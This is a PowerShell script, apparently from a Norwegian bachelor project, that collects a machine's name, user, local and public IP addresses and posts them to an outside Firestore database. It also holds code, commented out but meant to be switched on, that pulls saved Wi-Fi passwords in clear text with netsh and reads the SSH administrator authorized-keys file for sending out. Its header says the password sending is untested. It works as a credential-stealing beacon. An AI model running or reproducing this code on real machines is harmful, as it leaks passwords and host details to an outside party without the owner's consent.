# Slått sammen ssh.ps1 og netpass.ps1 så nettverkspassord også sendes
# Har ikke testet dette scriptet med sending av passord

# Define the URL for the Firestore database
$projectID = "bachelor-7e242"  # Your project ID
$collectionName = "machines"  # Target collection

# Get the name of the PC
$pcName = [System.Environment]::MachineName

# Get the current user's username
$userName = [System.Environment]::UserName

# Escape spaces in the PC name
$escapedPcName = $pcName.Replace(" ", "%20")

# Define the URL for the document
$documentUrl = "https://firestore.googleapis.com/v1/projects/$projectID/databases/(default)/documents/$collectionName/$escapedPcName"

# Create or update a document with a dummy field to initialize
$newDocBody = @{
    fields = @{
        dummyField = @{ stringValue = "init" }
    }
} | ConvertTo-Json -Depth 2

try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $newDocBody -ContentType 'application/json'
} catch {
    Write-Error "Error creating or updating document: $_"
}

# Wait to ensure the document is created or updated
Start-Sleep -Seconds 5

# Define the URL for the new sub-collection with the current date and time as the name
$dateTimeCollectionName = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
$newCollectionUrl = "$documentUrl/$dateTimeCollectionName"

# Get network passwords and store in JSON object
# $networkPasswords = @{}
$profiles = netsh wlan show profiles | Select-String -Pattern "All User Profile\s*:\s*(.+)"

# foreach ($profile in $profiles) {
    # $profileName = $profile.Matches.Groups[1].Value.Trim()
    # $keyInfo = netsh wlan show profile name="$profileName" key=clear | Select-String -Pattern "Key Content\s*:\s*(.+)"

    # if ($keyInfo) {
        # $key = $keyInfo.Matches.Groups[1].Value.Trim()
        # $networkPasswords[$profileName] = $key
    # }
# }

# Other info
$timestamp = Get-Date -Format "yyyyMMddTHHmmss"
# $authorizedKeys = Get-Content -Path C:\ProgramData\ssh\administrators_authorized_keys
$ethIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet").IPAddress
# $wifiIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi").IPAddress
$publicIP = (Invoke-WebRequest ifconfig.me/ip).Content
$user = whoami

$infoToSave = @{
    timestamp = @{ stringValue = $timestamp }
    # authorizedKeys = @{ stringValue = $authorizedKeys }
    ethIP = @{ stringValue = $ethIP }
    # wifiIP = @{ stringValue = $wifiIP }
    publicIP = @{ stringValue = $publicIP }
    user = @{ stringValue = $user }
    # Fjern kommentar under for å sende passord
    # networkPasswords = @{ stringValue = $networkPasswords }
}

# Create a JSON body for the POST request
$body = @{
    fields = $infoToSave
} | ConvertTo-Json -Depth 10

# Define HTTP headers
$headers = @{
    "Content-Type" = "application/json"
}

# Send the POST request to create the new sub-collection and store the information
try {
    $response = Invoke-RestMethod -Uri $newCollectionUrl -Method Post -Body $body -Headers $headers
} catch {
    Write-Error "Error sending data to Firestore: $_"
}

# Remove the dummy field
$removeDummyField = @{
    fields = @{
        dummyField = @{ nullValue = $null }
    }
} | ConvertTo-Json -Depth 2

try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $removeDummyField -ContentType 'application/json'
} catch {
    Write-Error "Error removing dummy field from the document: $_"
}
